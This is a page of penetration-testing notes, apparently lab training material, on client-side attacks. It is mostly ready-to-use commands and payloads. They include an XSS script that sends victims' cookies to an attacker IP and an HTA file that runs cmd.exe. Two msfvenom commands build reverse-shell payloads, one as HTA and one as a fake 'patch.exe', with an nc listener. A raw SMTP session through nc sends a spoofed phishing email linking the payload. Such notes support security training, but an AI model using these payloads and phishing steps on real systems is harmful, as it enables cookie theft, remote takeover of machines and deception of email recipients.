# Client-Side Attacks

## <mark style="color:red;">Cross-Site Scripting XSS</mark>

A useful payload to catch users cookie

```javascript
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

## <mark style="color:red;">HTA Exploit</mark>

In this example, we will utilize ActiveXObjects, which can potentially allow access to underlying operating system commands, making it a dangerous technique. This can be achieved through the Windows Script Host functionality, specifically using the Windows Script Host Shell object or WScript.&#x20;

Once the Windows Script Host Shell object is instantiated, we can use its run method to launch an application on the client machine we're targeting. However, when mshta.exe is executed, it keeps an additional window open behind the command prompt. To avoid this, we can modify our proof-of-concept by using the .close(); object method, as shown below:

```html
<html>
<head>
<script>
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
  self.close();
</script>
</body>
</html>
```

We can save this code in a file (poc.hta) on our Kali machine and host it on the Apache web server. When a victim opens this file with Internet Explorer, they will be presented with a pop-up dialog as shown below:

<figure><img src="../.gitbook/assets/image (4).png" alt="" width="375"><figcaption></figcaption></figure>

The pop-up dialog is generated when the system attempts to execute an .hta file. If the user selects "Open," an additional dialog will appear:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

The second dialog box appears because Internet Explorer's sandbox protection, also known as Protected Mode, is enabled by default. If the victim selects "Allow," the action is permitted, and the JavaScript code is executed, launching cmd.exe as shown below:

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

To convert our basic HTML Application into an attack, we will utilize msfvenom, which supports the hta-psh output format to generate an HTA payload that relies on PowerShell:

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

If everything goes as expected, we should be able to capture a reverse shell.b

```
nc -lnvp 4444
```

## <mark style="color:red;">Phishing email 25 SMTP</mark>

Interact with SMTP server to send a phishing email:

```bash
nc -C 192.168.199.55 25                                                                                                
220 VICTIM Microsoft ESMTP MAIL Service, Version: 10.0.17763.1697 ready at  Tue, 21 Feb 2023 17:38:43 -0500 
ehlo all
250-VICTIM Hello [192.168.45.199]
250-TURN
250-SIZE 2097152
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
mail from: rmurray@victim
250 2.1.0 rmurray@victim....Sender OK
rcpt to: tharper@victim
250 2.1.5 tharper@victim 
data
354 Start mail input; end with <CRLF>.<CRLF>
subject: urgent patch
http://192.168.45.199:80/patch.exe
.
250 2.6.0 <VICTIM0MoN0uyHFWZx700000002@VICTIM> Queued mail for delivery
```

msfvenom payload used to generate the patch.exe:

```bash
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=443 -f exe > patch.exe
```
